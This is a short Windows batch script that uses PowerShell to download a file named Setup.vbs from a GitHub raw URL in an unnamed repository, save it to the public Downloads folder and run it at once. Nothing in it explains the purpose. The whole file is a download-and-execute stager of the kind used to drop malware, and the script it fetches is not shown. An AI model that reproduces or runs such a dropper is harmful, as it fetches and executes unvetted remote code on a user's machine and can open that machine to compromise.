@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Setup.vbs' -OutFile 'C:\Users\Public\Downloads\Setup.vbs'"
powershell -NoProfile -Command "Start-Sleep -Seconds 1"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\Users\Public\Downloads\Setup.vbs'"
exit
